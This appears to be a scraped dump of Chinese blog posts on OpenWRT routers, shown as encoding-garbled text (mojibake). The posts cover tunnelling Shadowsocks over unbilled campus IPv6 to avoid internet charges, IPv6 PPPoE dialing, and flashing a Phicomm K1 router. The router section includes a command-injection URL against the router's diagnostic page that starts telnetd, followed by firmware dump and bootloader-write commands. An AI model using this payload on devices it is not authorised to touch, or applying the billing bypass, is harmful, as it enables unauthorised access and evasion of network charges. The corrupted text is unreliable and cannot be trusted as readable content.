¡ï¼Œipv4ä¸€èˆ¬æ˜¯è®¡æµé‡æˆ–è®¡æ—¶æ”¶è´¹çš„ï¼Œï¼ˆç¬”è€…å­¦æ ¡å°±æ˜¯è®¡æ—¶æ”¶è´¹çš„ï¼Œ50å…ƒ200å°æ—¶ç½‘é€šåå…†å¸¦å®½ï¼‰è€Œä¸”ï¼Œç”±äºæ ¡å›­çš„ç‰¹æ®Šæ€§ï¼Œç›¸åº”çš„ä»·æ ¼ä¹Ÿæ¯”å¸‚é¢ä¸Šå®½å¸¦æœåŠ¡å•†è¦é«˜ã€‚ä¸‡å¹¸çš„æ˜¯ï¼Œè¿™äº›é«˜æ ¡ä¸€èˆ¬å…·æœ‰ipv6ç½‘ç»œç¯å¢ƒï¼Œå¹¶ä¸”ç”±äºå›½å®¶çš„å¤§åŠ›æ”¯æŒï¼Œæ™®åŠèŒƒå›´å¹¿ï¼Œè€Œä¸”ä¸è®¡ç®—æµé‡ï¼Œèªæ˜çš„äººæ—©å°±æƒ³èƒ½ä¸èƒ½é€šè¿‡åˆ©ç”¨ipv6å·²è¾¾åˆ°å…æµé‡åŠæ— é™æ—¶é•¿ä¸Šç½‘ï¼Ÿç­”æ¡ˆæ˜¯å¯è¡Œçš„ï¼Œé‰´äºç›®å‰å…¬ç½‘çš„ç¯å¢ƒæ™®éæ˜¯ipv4ï¼Œæˆ‘ä»¬å¯ä»¥æ‰¾ä¸€å°åŒæ—¶å…·æœ‰ipv4å’Œipv6åœ°å€çš„æœåŠ¡å™¨ï¼Œæˆ‘ä»¬åœ¨æ ¡å†…é€šè¿‡ipv6è®¿é—®æœåŠ¡å™¨ï¼Œç„¶åæœåŠ¡å™¨å¤„ç†æˆ‘ä»¬çš„è®¿é—®è¯·æ±‚ä»¥ipv4/ipv6åŒæ ˆçš„æ–¹å¼ä»£æ›¿æˆ‘ä»¬è®¿é—®äº’è”ç½‘ï¼Œå†å°†æ•°æ®é€šè¿‡ipv6åé¦ˆç»™æˆ‘ä»¬ï¼Œä»è€Œåˆ°è¾¾å…æµä¸Šç½‘çš„ç›®çš„ã€‚å¹¶ä¸”ï¼Œè€ƒè™‘åˆ°å¤§éƒ¨åˆ†é«˜æ ¡ipv6æ²¡æœ‰é™åˆ¶é€Ÿåº¦ï¼Œç†è®ºä¸Šå¯ä»¥è¾¾åˆ°æœåŠ¡å™¨å‡ºå£çš„å¸¦å®½ï¼Œå½“ç„¶ï¼Œå…·ä½“å–å†³äºä½ ä»¬å­¦æ ¡çš„ipv6å‡ºå£å¸¦å®½ã€‚\nä¸ºä»€ä¹ˆç”¨Shadowsocksï¼Ÿ é…ç½®ç®€å•ï¼ŒçœŸçš„ç®€å•ï¼ä»¥å‰çœ‹åˆ°è¿‡ä¿¡æ¯å­¦é™¢çš„å­¦é•¿å†™çš„ä¸€ç¯‡blog,åŸç†æ˜¯ipv6 to ipv4 ä»è€Œipv6 to ipv4ç½‘ç»œ,å…¶å®åŸç†æ˜¯ä¸€æ ·çš„ï¼Œåªæ˜¯ä»–ç”¨äº†openvpnè¿™ä¸ªè½¯ä»¶ï¼Œä½†æ˜¯æ„Ÿè§‰å®ç°èµ·æ¥å¥½éš¾ã€‚åƒè¿™æ ·çš„å¼€æºæ”¯æŒipv6åè®®çš„è½¯ä»¶è¿˜æ˜¯æœ‰å¾ˆå¤šçš„ï¼Œè¿™é‡Œå°±ä¸å†é™ˆè¿°ã€‚\nå›åˆ°åŸé¢˜ä¸ºä»€ä¹ˆç”¨Shadowsocksï¼Œé…ç½®ç®€å•ã€‚vpsæœåŠ¡æä¾›å•†æ¬ç“¦å·¥ç°åœ¨ä¸ºäº†è¿åˆå›½äººçš„éœ€æ±‚ç°åœ¨å·²ç»é¢„é…äº†Shadowsocks,åªéœ€è¦ç‚¹å‡»ä»¥ä¸‹å®‰è£…å°±okäº†ã€‚\né€‚ç”¨å¯¹è±¡ å…·æœ‰ipv6åœ°å€ã€ipv4æµé‡ï¼ˆè®¡æ—¶ï¼‰æ”¶è´¹è´µçˆ±æŠ˜è…¾çš„å¤§å­¦ç”Ÿã€‚ä¸æ¨èæ‰“å›½æœæ¸¸æˆï¼Œå»¶è¿Ÿä½ æ‡‚çš„ï¼Œä½†å¯¹å»¶è¿Ÿæ²¡è¦æ±‚çš„æ¸¸æˆè¿˜æ˜¯å¯ä»¥ç©çš„ï¼Œç¾æœã€äºšæœã€å°æœéšä½ ç©ã€‚\nå‡†å¤‡ openwrtå›ºä»¶è·¯ç”±å™¨ è·¯ç”±å™¨çš„åˆ·æœºè¯·è‡ªè¡ŒGoogle,æ•™ç¨‹ä¸€å¤§å †ï¼Œåˆ·æœºæ—¶ç¬”è€…ä¹Ÿé‡åˆ°è¿‡å¾ˆå¤šé—®é¢˜ï¼ŒåšæŒï¼å¦‚æœä½ çš„ä¹Ÿæ˜¯K1è·¯ç”±å™¨ï¼Œä¹Ÿè¦åˆ·æœºï¼Œä¸å¦¨çœ‹è¿™ä¸ªæ•™ç¨‹ã€‚åˆ·æœºçš„é‡ç‚¹æ˜¯åˆ·Shadowsocksæ’ä»¶ï¼Œæˆ‘çš„K1ç›´æ¥åˆ·çš„æ¥è‡ªæ©å±±ç½‘å‹çš„å›ºä»¶ï¼Œå›ºä»¶é‡Œå·²ç»é™„å¸¦äº†Shadowsocksã€‚openwrtå›ºä»¶è‡ªå–ã€‚openwrtæ§åˆ¶é¢æ¿ä¸Šå›¾ã€‚\nShadowsocks+ipv6èŠ‚ç‚¹ä¿¡æ¯ å› ä¸ºç¬”è€…æ‰‹é‡Œæœ‰å°ç¾å›½çš„vpsï¼Œå¹¶ä¸”é…ç½®äº†Shadowsocksï¼Œæ‰€ä»¥ç°åœ¨æ‹¿æ¥å°±ç›´æ¥ç”¨ï¼Œè€å®è¯´æ­å»ºçš„Shadowsockså¹³å¸¸å¾ˆå°‘ç”¨ï¼Œä¹‹å‰è§‰å¾—ç§Ÿè¿™ä¸ªvpså¾ˆæ˜¯æµªè´¹ã€‚ä½†æ˜¯è‡ªä»å¯å®¤é‡Œæœ‰äº†è¿™å°å…¨å¤©å€™å¼€æœºçš„è·¯ç”±å™¨ï¼Œå€¼äº†ï¼åœ¨è¿™é‡Œæˆ‘è¦å¼ºè°ƒä¸€ä¸‹ï¼ŒShadowsocksçš„èŠ‚ç‚¹æˆ‘ä»¬éœ€è¦ipv6åœ°å€çš„ï¼Œä¸ç„¶è¿˜æ˜¯æ²¡æ³•èµ°æ ¡å†…çš„ipv6é€šé“ã€‚\nå‰æ–¹é«˜èƒ½é¢„è­¦ æ“ä½œ é¦–å…ˆopenwrtå›ºä»¶è·¯ç”±å™¨ç™»é™†192.168.1.1ï¼Œåˆå§‹ç™»å½•é»˜è®¤å¯†ç æ˜¯ï¼šadminã€‚ç™»è¿›å»ä¹‹åæœ€å¥½å…ˆä¸è¦å¯¹ä»»ä½•ä¸œè¥¿æ”¹åŠ¨ï¼ŒæŒ‰ç…§æ­£å¸¸è·¯ç”±å™¨çš„é…ç½®å¯¹è·¯ç”±å™¨è¿›è¡Œæ‹¨å·ä¸Šç½‘ã€‚ç„¶åé€‰æ‹©Shadowsocksæ’ä»¶ï¼Œé€‰æ‹©å¯åŠ¨ã€‚ï¼ˆä¸ºä»€ä¹ˆè¿™æ ·åšå‘¢ï¼Ÿç¬”è€…å°è¯•äº†å‡ ä¸‹ï¼Œä¸æ‹¨å·ä¸Šç½‘çš„è¯ï¼ŒShadowsockså’ŒDNSé…ç½®å¥½äº†ä»¥åæ— æ³•ä¸Šç½‘ï¼Œæœ€åæ€»ç»“ï¼Œå…ˆæ‹¨å·ä¸Šç½‘ã€å†é…ç½®Shadowsockså’ŒDNSä¿¡æ¯ï¼‰\næ­¥éª¤ï¼šç‚¹å‡» openwrtæœåŠ¡\u0026gt;Shadowsocksï¼Œå‡ºç°ä»¥ä¸‹ç•Œé¢ã€‚\nShadowsocksçš„é…ç½® 1 2 3 4 æœåŠ¡å™¨ipï¼š å¯†ç ï¼š æœåŠ¡å™¨ç«¯å£ï¼š åŠ å¯†æ–¹å¼ï¼š å¯¹Shadowsocksé…ç½®å¥½äº†ä»¥åï¼Œç‚¹å‡»ä¸‹é¢çš„é€æ˜ä»£ç†ï¼Œé€‰æ‹©å¯åŠ¨ã€‚\nå¯¹Shadowsocksé…ç½®å¥½ä»¥åï¼Œæˆ‘ä»¬çš„ä»»åŠ¡è¿˜æ²¡æœ‰ç»“æŸï¼Œæœ€é‡è¦çš„å°±æ˜¯é…ç½®DNSä¿¡æ¯ã€‚è¿™é‡Œå¦‚æœä¸é…ç½®DNSï¼ŒIPåœ°å€é€‰æ‹©ipv4çš„ï¼ŒShadowsocksæ˜¯å›½å¤–çš„ï¼Œé‚£ä¹ˆé€šè¿‡è¿™ç§æ–¹å¼ä½¿ç”¨Shadowsockså°±æ˜¯é€šè¿‡è·¯ç”±å™¨æ¥ç¿»fqï¼Œåœ¨è¿™é‡Œæˆ‘å°±ä¸å¤šè¯´äº†ã€‚\nDNSçš„é…ç½® DNSè®¾ç½®æœ‰ä¸¤ç§æ–¹æ¡ˆï¼Œä¸€ç§æ˜¯åˆ©ç”¨ChinaDNSï¼Œè¿˜æœ‰ä¸€ç§ç›´æ¥åœ¨DHCP/DNSè®¾ç½®é¡µé¢ï¼ˆç½‘ç»œ\u0026gt;DHCP/DNSï¼‰è¿›è¡Œå¡«å†™ã€‚\nç”±äºæœ¬æ¬¡æŠ˜è…¾çš„ç‰¹æ®Šæ€§ï¼Œè·¯ç”±å™¨å·¥ä½œåœ¨çº¯ipv6ç¯å¢ƒä¸‹ï¼Œä¹Ÿå°±æ˜¯è¯´è·¯ç”±å™¨æ²¡æœ‰ipv4çš„ç½‘ç»œï¼Œä½†å¸¸ç”¨çš„DNSæœåŠ¡å™¨å¤§å¤šæ˜¯ä»¥ipv4åœ°å€æ–¹å¼æä¾›çš„ï¼Œå¦‚æœä½¿ç”¨ipv4çš„DNSæœåŠ¡å™¨å°±ä¼šå¯¼è‡´æ— æ³•è§£æã€‚æ­¤å¤„ç”¨äº†[2001:470:0:c0::2]ï¼Œä½†æ˜¯å¾ˆä¸å¹¸ï¼Œè¯¥DNSè¢«æ±¡æŸ“äº†ï¼Œæ— æ³•è§£æå¦‚googleï¼Œyoutubeä¸€ç±»ç½‘å€ï¼Œä½†æ˜¯å¯¹å›½å†…çš„ç½‘ç«™çš„è§£æå¾ˆå¥½ã€‚\n1 2001:470:0:c0::2 å…¶ä»–çš„DNSæœ€å¥½é€‰æ‹©Googleçš„ï¼Œç›¸å¯¹çš„æ¥è¯´ï¼Œç½‘ç«™è§£ææœ€å…¨é¢ï¼Œè€Œä¸”è¿˜å¯ä»¥fq,åªæ˜¯ä¸€éƒ¨åˆ†äº†ï¼Œé€‰æ‹©Googleçš„å…¬å…±DNSæœ‰ä¸€ä¸ªç¼ºç‚¹ï¼Œå°±æ˜¯åƒç§»åŠ¨ç«¯çš„å¾®ä¿¡æˆ–è€…qqäº†ï¼Œæœ‹å‹åœˆçš„ä¿¡æ¯æˆ–å…¬ä¼—å·åŠ è½½ä¸å‡ºæ¥ï¼Œè¿™æ˜¯å¾ˆè›‹ç–¼çš„äº‹æƒ…ã€‚ä¸ªäººè¿˜æ˜¯æ¨èä¸Šé¢çš„é‚£æ¡DNS,é€Ÿåº¦å¿«ã€å›½å†…ç½‘ç«™å…¨é¢ï¼Œå‡ ä¹å…¨è¦†ç›–ã€‚\nä¸‹é¢æ˜¯ä¸€äº›ä»ç½‘ä¸Šæ‰¾æ¥çš„å…¬å…±DNSï¼Œå¯ä»¥è¯•éªŒä¸€ä¸‹ï¼Œè¯´ä¸å®šæœ‰ä»€ä¹ˆä»¥å¤–çš„æ”¶è·å‘¢ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 ordns.he.net 2001:470:20::2 74.82.42.42 tserv1.fmt2.he.net 2001:470:0:45::2 72.52.104.74 tserv1.dal1.he.net 2001:470:0:78::2 216.218.224.42 tserv1.ams1.he.net 2001:470:0:7d::2 216.66.84.46 tserv1.mia1.he.net 2001:470:0:8c::2 209.51.161.58 tserv1.tor1.he.net 2001:470:0:c0::2 216.66.38.58 ns.ipv6.uni-leipzig.de 2001:638:902:1::10 139.18.25.34 Google Public DNS 1 2 3 google-public-dns-a.google.com 2001:4860:4860::8888 8.8.8.8 google-public-dns-b.google.com 2001:4860:4860::8844 8.8.4.4 ç å­—ä¸å®¹æ˜“ï¼Œåœ¨è¿™é‡Œéå¸¸æ„Ÿè°¢_Echoå’Œå¼ å“²ä¸¤äººçš„post.\nè½¬è½½è‡ªDyhube\n","permalink":"https://www.hacktech.cn/post/%E5%9F%BA%E4%BA%8Eopenwrt-shadowsocks-ipv6%E5%AE%9E%E7%8E%B0%E6%A0%A1%E5%9B%AD%E7%BD%91%E5%85%8D%E6%B5%81%E9%87%8F%E6%97%A0%E9%99%90%E6%97%B6%E9%95%BF%E4%B8%8A%E7%BD%91.html","summary":"\u003cblockquote\u003e\n\u003cp\u003eè½¬è½½è‡ª\u003ca href=\"http://www.jianshu.com/p/4d44172f1a5b\"\u003eDyhube\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch1 id=\"ç®€è¿°\"\u003eç®€è¿°\u003c/h1\u003e\n\u003cp\u003eç¬”è€…åˆ©ç”¨ç¬”è®°æœ¬ç”µè„‘å®ç°ipv6å…è´¹ä¸Šç½‘å·²ç»æœ‰ä¸€æ®µæ—¶é—´äº†ï¼ŒåŸç†æ˜¯é€šè¿‡ipv6è®¿é—®ipv4èµ„æºï¼Œåœ¨å­¦æ ¡ç½‘ç»œä¸é™æµé‡ã€ä¸é™æ—¶é•¿ã€20å…†å¸¦å®½ï¼ˆæˆ‘ä»¬å­¦æ ¡ipv6é™é€Ÿä¸Šä¸‹å¯¹ç­‰20å…†ï¼Œæ²¡åŠæ³•ï¼ï¼‰,ç”µè„‘å¼€çƒ­ç‚¹å…¨å¯å®¤å…±ç”¨ï¼Œé‚£çœŸæ˜¯çˆ½ç¿»å¤© !\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/images/uploads/467652383161435874515f6c4d467645313778574635516237307835.png\" alt=\"ipv6\"  /\u003e\n\u003c/p\u003e","title":"åŸºäºOpenwrt+Shadowsocks+ipv6å®ç°æ ¡å›­ç½‘å…æµé‡æ— é™æ—¶é•¿ä¸Šç½‘"},{"content":" æ–‡ç« æ¥æºäºç¾¤å‹ï¼Œå¦‚æœ‰ä¾µæƒï¼Œè¯·è”ç³»æˆ‘(aha971030@gmail.com)åˆ é™¤\nåŸç†ä»‹ç»åˆ†æï¼š æ¹–åŒ—Eä¿¡åœ°åŒºå¯ä»¥ä½¿ç”¨ipv6æ‹¨å·ï¼Œå¥½å¤„æ˜¯ç½‘ç»œæ˜¯ä¸Šä¸‹å¯¹ç­‰ä¸é™é€Ÿç½‘ç»œï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œä½ çš„ç«¯å£ä¸Šé™æ˜¯å¤šå°‘ï¼Œç½‘ä¸Šå°±å¯ä»¥è¾¾åˆ°å¤šå°‘ï¼Œæˆ‘æµ‹è¯•å¾ˆå¤šæ¬¡ï¼Œä¸€èˆ¬åœ¨100Må·¦å³ï¼Œä½†æ˜¯é—æ†¾çš„æ˜¯ï¼Œè¯¥æ‹¨å·æ–¹å¼åªèƒ½ä½¿ç”¨32ä½ç³»ç»Ÿï¼Œä¸”ç”±äºEä¿¡è½¯ä»¶çš„å…¼å®¹æ€§é—®é¢˜ï¼Œå¾ˆå®¹æ˜“å¯¼è‡´è“å±æ­»æœºã€‚ç»è¿‡å¤§ç¥çš„æŠ“åŒ…åˆ†æï¼Œè¯¥æ‹¨å·æ–¹å¼æ˜¯ä½¿ç”¨ipv6çš„éš§é“åè®®ä¼ é€’ipv4ä¿¡å·ã€‚è€Œå¹¸è¿çš„æ˜¯ï¼Œç°åœ¨çš„openwrtæ”¯æŒè¯¥åè®®ã€‚ä¹Ÿå°±æ˜¯è¯´å¯ä»¥ä½¿ç”¨åŸºäºopenwrtçš„è·¯ç”±å™¨é‡‡ç”¨ipv6æ‹¨å·ã€‚\næ“ä½œæ­¥éª¤ï¼š é¦–å…ˆè¦æ˜ç¡®æ˜¯ï¼Œè¯¥æ‹¨å·æ–¹å¼ä¹Ÿæ˜¯éœ€è¦è¿›è¡Œè´¦å·æ¢ç®—çš„ï¼Œé¦–å…ˆå¯åŠ¨è·¯ç”±å™¨ï¼Œå¹¶æ’ä¸Šç½‘çº¿ï¼Œåœ¨ç”µè„‘ä¸Šä¸‹è½½winscpè¿™æ¬¾è½¯ä»¶ï¼Œç„¶åæˆ‘ä»¬æŸ¥è¯¢ä¸€ä¸‹æˆ‘ä»¬çš„ipåœ°å€ï¼Œåœ¨ç”µè„‘çš„dosç•Œé¢è¾“å…¥ipconfigï¼Œæ‰¾åˆ°ä»¥å¤ªç½‘é…ç½®å™¨\né»˜è®¤ç½‘å…³å°±æ˜¯è·¯ç”±å™¨çš„ç®¡ç†ipã€‚\nç„¶åæˆ‘ä»¬å¯åŠ¨è½¯ä»¶ï¼ŒæŒ‰ç…§å›¾ç‰‡è®¾ç½®å¡«å…¥æ•°æ®\nç„¶åæˆ‘ä»¬å°±è¿›å…¥äº†è·¯ç”±å™¨çš„æ–‡ä»¶ç³»ç»Ÿ\næ¥ç€ï¼Œæˆ‘ä»¬è¦åšçš„æ˜¯ï¼Œè¿›å…¥è·¯ç”±å™¨è®¾ç½®é‡Œé¢è®¾ç½®ç›¸å…³ç«¯å£å‚æ•°\nåœ¨ç”µè„‘çš„æµè§ˆå™¨é‡Œè¾“å…¥ç®¡ç†ipåœ°å€\nè¿›å…¥ç«¯å£è®¾ç½®ç•Œé¢\né¦–å…ˆè®¾ç½®wanå£å‚æ•°\nåˆ‡æ¢åè®®ä¸ºPPPOEï¼Œå¹¶éšä¾¿è¾“å…¥è´¦å·å¯†ç ï¼ˆå…·ä½“çš„æ‹¨å·çš„è´¦å·å¯†ç åœ¨åé¢æˆ‘ä»¬ä¼šåŠ ä»¥æ›´æ”¹ï¼‰å¹¶åœ¨é«˜çº§è®¾ç½®é‡Œå‹¾é€‰ä»¥ä¸‹å‚æ•°\nç„¶åä¿å­˜å¹¶åº”ç”¨\nç„¶åæˆ‘ä»¬è®¾ç½®lanå£å‚æ•°\næŒ‰ç…§è¯¥å›¾è®¾ç½®\næœ€åï¼Œæˆ‘ä»¬å›åˆ°æ¥å£æ€»ç•Œé¢ï¼Œè‡ªå·±åˆ›å»ºä¸€ä¸ªç«¯å£\nåå­—æ— æ‰€è°“ï¼Œä½†åè®®è¦é€‰æ‹©rfc6333\næäº¤ä»¥åå¡«å†™ipv6çš„åœ°å€ï¼Œç»è¿‡å¤§ç¥çš„å°è¯•ï¼Œä¸‹é¢ç»™çš„è¿™ä¸ªåœ°å€æ˜¯æ¯”è¾ƒç¨³å®šçš„ï¼Œå»ºè®®ä½¿ç”¨\n240e:d:1000::ffff:1: å¹¶åœ¨é«˜çº§è®¾ç½®é‡Œé¢å‹¾é€‰é»˜è®¤ç½‘å…³\nåœ¨é˜²ç«å¢™è®¾ç½®é‡Œï¼ŒæŠŠè¿™ä¸ªé“¾æ¥æ‹‰åˆ°wanå£é‡Œ\næœ€åä¿å­˜\nè¿™æ ·ï¼Œè·¯ç”±å™¨ä¸Šçš„è®¾ç½®å°±ç»“æŸäº†ï¼Œä¸‹é¢è½¬å…¥é…ç½®æ–‡ä»¶çš„ä¿®æ”¹ä¸Š\nä¾æ¬¡é¡ºåºè¿›å…¥åˆ°å¦‚ä¸‹è·¯å¾„\nåŒå‡»networkæ–‡ä»¶æ‰“å¼€\nå¹¶åœ¨æ–‡ä»¶çš„ä½ç½®æ›´æ”¹\nç„¶åç‚¹å‡»ä¿å­˜\nç„¶åè¿›å…¥åˆ°æ­¤ç›®å½•ï¼Œä¸Šä¼ æˆ‘ä»¬å‡†å¤‡çš„Eä¿¡ç®—æ³•åº“æ–‡ä»¶\næœ€åé‡å¯ä¸€ä¸‹è·¯ç”±å™¨ï¼ŒåŒæ­¥ä¸€ä¸‹è·¯ç”±å™¨çš„æ—¶é—´ï¼Œå°±å¯ä»¥äº† æ³¨æ„ï¼Œä¸åŒçš„èŠ¯ç‰‡å’Œä¸åŒåœ°åŒºçš„openwrtè·¯ç”±å™¨ï¼Œsxplugin.soæ–‡ä»¶æ˜¯ä¸ä¸€æ ·çš„ï¼Œå…·ä½“è¯·æŸ¥çœ‹æˆ‘ä¸Šä¸€ç¯‡æ–‡ç« æ‰“åŒ…çš„ä¸œè¥¿ã€‚\nå†è¯´ä¸€æ¬¡ï¼Œæ–‡ç« æ¥æºäºç¾¤å‹ï¼Œå¦‚æœ‰ä¾µæƒï¼Œè¯·è”ç³»æˆ‘(aha971030@gmail.com)åˆ é™¤\n","permalink":"https://www.hacktech.cn/post/openwrt%E8%B7%AF%E7%94%B1%E5%99%A8%E4%BD%BF%E7%94%A8ipv6%E6%8B%A8%E5%8F%B7%E4%B8%8A%E7%BD%91%E6%95%99%E7%A8%8B.html","summary":"\u003cblockquote\u003e\n\u003cp\u003eæ–‡ç« æ¥æºäºç¾¤å‹ï¼Œå¦‚æœ‰ä¾µæƒï¼Œè¯·è”ç³»æˆ‘(\u003ca href=\"mailto:aha971030@gmail.com\"\u003eaha971030@gmail.com\u003c/a\u003e)åˆ é™¤\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch1 id=\"åŸç†ä»‹ç»åˆ†æ\"\u003eåŸç†ä»‹ç»åˆ†æï¼š\u003c/h1\u003e\n\u003cp\u003eæ¹–åŒ—Eä¿¡åœ°åŒºå¯ä»¥ä½¿ç”¨ipv6æ‹¨å·ï¼Œå¥½å¤„æ˜¯ç½‘ç»œæ˜¯ä¸Šä¸‹å¯¹ç­‰ä¸é™é€Ÿç½‘ç»œï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œä½ çš„ç«¯å£ä¸Šé™æ˜¯å¤šå°‘ï¼Œç½‘ä¸Šå°±å¯ä»¥è¾¾åˆ°å¤šå°‘ï¼Œæˆ‘æµ‹è¯•å¾ˆå¤šæ¬¡ï¼Œä¸€èˆ¬åœ¨100Må·¦å³ï¼Œä½†æ˜¯é—æ†¾çš„æ˜¯ï¼Œè¯¥æ‹¨å·æ–¹å¼åªèƒ½ä½¿ç”¨32ä½ç³»ç»Ÿï¼Œä¸”ç”±äºEä¿¡è½¯ä»¶çš„å…¼å®¹æ€§é—®é¢˜ï¼Œå¾ˆå®¹æ˜“å¯¼è‡´è“å±æ­»æœºã€‚ç»è¿‡å¤§ç¥çš„æŠ“åŒ…åˆ†æï¼Œè¯¥æ‹¨å·æ–¹å¼æ˜¯ä½¿ç”¨ipv6çš„éš§é“åè®®ä¼ é€’ipv4ä¿¡å·ã€‚è€Œå¹¸è¿çš„æ˜¯ï¼Œç°åœ¨çš„openwrtæ”¯æŒè¯¥åè®®ã€‚ä¹Ÿå°±æ˜¯è¯´å¯ä»¥ä½¿ç”¨åŸºäºopenwrtçš„è·¯ç”±å™¨é‡‡ç”¨ipv6æ‹¨å·ã€‚\u003c/p\u003e\n\u003ch1 id=\"æ“ä½œæ­¥éª¤\"\u003eæ“ä½œæ­¥éª¤ï¼š\u003c/h1\u003e\n\u003cp\u003eé¦–å…ˆè¦æ˜ç¡®æ˜¯ï¼Œè¯¥æ‹¨å·æ–¹å¼ä¹Ÿæ˜¯éœ€è¦è¿›è¡Œè´¦å·æ¢ç®—çš„ï¼Œé¦–å…ˆå¯åŠ¨è·¯ç”±å™¨ï¼Œå¹¶æ’ä¸Šç½‘çº¿ï¼Œåœ¨ç”µè„‘ä¸Šä¸‹è½½winscpè¿™æ¬¾è½¯ä»¶ï¼Œç„¶åæˆ‘ä»¬æŸ¥è¯¢ä¸€ä¸‹æˆ‘ä»¬çš„ipåœ°å€ï¼Œåœ¨ç”µè„‘çš„dosç•Œé¢è¾“å…¥ipconfigï¼Œæ‰¾åˆ°ä»¥å¤ªç½‘é…ç½®å™¨\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/images/uploads/46684b4769627865654d4c65635a46454c4c5f4a396a786735675839.png\" alt=\"network111\"  /\u003e\n\u003c/p\u003e","title":"OpenWRTè·¯ç”±å™¨ä½¿ç”¨ipv6æ‹¨å·ä¸Šç½‘æ•™ç¨‹"},{"content":"â—†è´­ä¹°æ–è®¯k1è·¯ç”±å™¨ è·¯ç”±å™¨åœ¨å¤©çŒ«äº¬ä¸œæ–è®¯æ——èˆ°åº—éƒ½æœ‰å”®å–ï¼Œæˆ‘ä¹°çš„ä»·æ ¼æ˜¯159ï¼Œä¸è¿‡æœ‰ä¸€å¼ é“ƒé“›å¡ï¼Œä¸€ä¸ªæœˆä¹‹åè¿”è¿˜160å…ƒï¼Œç›¸å½“äº0å…ƒè´­\nâ—†è·¯ç”±å™¨åˆ·ä¸æ­»Breed 1.è·¯ç”±ä¸ç”µè„‘æœ‰çº¿è¿æ¥å¥½ï¼Œè¾“å…¥192.168.2.1ï¼Œå®Œæˆè®¾ç½® 2.åœ¨æµè§ˆå™¨åœ°å€æ è¾“å…¥ï¼šhttp://192.168.2.1/goform/Diagnosis?pingAddr=192.168.2.100|echo\u0026quot;\u0026quot;|telnetd (å¦‚æœä½ çš„ç”µè„‘ipä¸æ˜¯192.168.2.100,è¯·æ”¹æˆä½ ç”µè„‘çš„ip(å†…ç½‘ip))\n3.æ‰“å¼€tftpï¼Œè¿™é‡Œç”¨tftp32æ¼”ç¤ºï¼ŒæŒ‰å›¾è®¾ç½® 4.æ‰“å¼€CMD,åŠ¡å¿…ä½¿ç”¨ç®¡ç†å‘˜æƒé™ï¼Œtelnet 192.168.2.1 5.è¾“å…¥ç”¨æˆ·åå¯†ç  6.è¾“å…¥å‘½ä»¤ 1 2 3 4 5 6 7 8 9 10 11 1) cd /tmp 2) tftp â€“g â€“l /tmp/breed.bin â€“r breed.bin 192.168.2.100 3) cat /dev/mtd1 \u0026gt;/tmp/mtd1.bin cat /dev/mtd0 \u0026gt;/tmp/mtd0.bin 4) tftp â€“p â€“r mtd1.bin â€“l /tmp/mtd1.bin 192.168.2.100 tftp â€“p â€“r mtd1.bin â€“l /tmp/mtd1.bin 192.168.2.100 5) mtd_write write breed.bin Bootloader ç­‰å¾…å‡ºç°#å­— 7.æ‹”æ‰ç”µæºï¼Œç„¶åæŒ‰ä½reseté”®æ’ä¸Šç”µæºï¼Œåœ°å€æ è¾“å…¥192.168.1.1ï¼Œå°±è¿›å…¥äº†breedç•Œé¢ æ‡’äººä¸€é”®å¼å®‰è£…æ³•ï¼š è¾“å…¥ï¼š wgetÂ http://breed.hackpascal.net/breed-mt7620-reset1.bin ç„¶åè¾“å…¥ï¼š mtd_writeÂ writeÂ breed-mt7620-reset1.binÂ Bootloader\nç­‰å¾…å‡ºç°#å­—ï¼ˆä»£è¡¨ç€å·²ç»å®Œæˆï¼‰\nåˆ·breedåè¯­ åªè¦è·¯ç”±breedä¸è¢«å˜åŠ¨ï¼Œè·¯ç”±åˆ·é”™å›ºä»¶ä¹Ÿä¸æ€•ï¼ŒåŒæ ·æ–¹å¼è¿›å…¥breedåˆ·å›æ­£ç¡®çš„å³å¯ã€‚\næ¨èæ¯æ¬¡åˆ·å®Œå›ºä»¶åï¼Œå»å›ºä»¶ç³»ç»Ÿç®¡ç†\u0026ndash;æ¢å¤åŸå‚é»˜è®¤å€¼ã€‚\nâ—†åˆ·openWRT 1.åˆ·æ–°å›ºä»¶ æˆ‘åœ¨ä¸‹é¢çš„æ–‡ä»¶ä¸­æ‰“åŒ…äº†ä¸¤ä¸ªå›ºä»¶ï¼Œä¸€ä¸ªæ˜¯æ½˜å¤šæ‹‰çš„K1ä¸“ç‰ˆï¼Œä¸€ä¸ªæ˜¯openWRTï¼Œæˆ‘è‡ªå·±ä½¿ç”¨çš„æ˜¯ä¸“ç‰ˆæ½˜å¤šæ‹‰ï¼Œå„ä½çœ‹å®˜è‡ªå·±é€‰æ‹©ï¼Œåˆ·æ–°å›ºä»¶å¾ˆç®€å•ï¼Œçœ‹å›¾ ç‚¹å‡»æ›´æ–°ï¼Œçœ‹è·¯ç”±ç¯å…¨éƒ¨äº®èµ·åï¼Œæ— çº¿ç½‘ç»œå‡ºç°,OK\nâ—†å®‰è£…eä¿¡(NetKeeper)æ’ä»¶å¹¶è¿›è¡Œæ‹¨å· 1.ä½ å¾—å‡†å¤‡ä¸€äº›ä¸œè¥¿(WINSCPä¸€ä¸ªï¼Œopç³»ç»Ÿç›¸å…³netkeeperä¸€åªï¼‰æ‰¾åˆ°å¯¹åº”åœ°åŒºæ›´æ”¹æ–‡ä»¶åä¸ºsxplugin.so 2.é€šè¿‡WINSCPç™»å½•ä½ çš„è·¯ç”±å™¨ ** æ³¨æ„ä½¿ç”¨scpåè®®ï¼Œå¯†ç adminï¼ˆç¬¬ä¸€æ¬¡ç™»å½•opéœ€è¦é‡è®¾å¯†ç ä¾ç„¶è®¾ä¸ºadminå°±å¯ä»¥äº† **\n3.æ”¾å…¥æ‹¨å·æ’ä»¶ ç™»å½•ä¹‹åæ‰“å¼€è·¯ç”±å™¨ï¼Œåœ¨è¿™å„¿é€‰æ‹©/(rootï¼‰ç„¶åé€‰æ‹©/usr/lib/pppd/2.4.7æ–‡ä»¶å¤¹å°†ä½ ç¼–è¾‘å¥½çš„sxplugin.soæ–‡ä»¶æ”¾å…¥å³å¯ï¼ˆ** 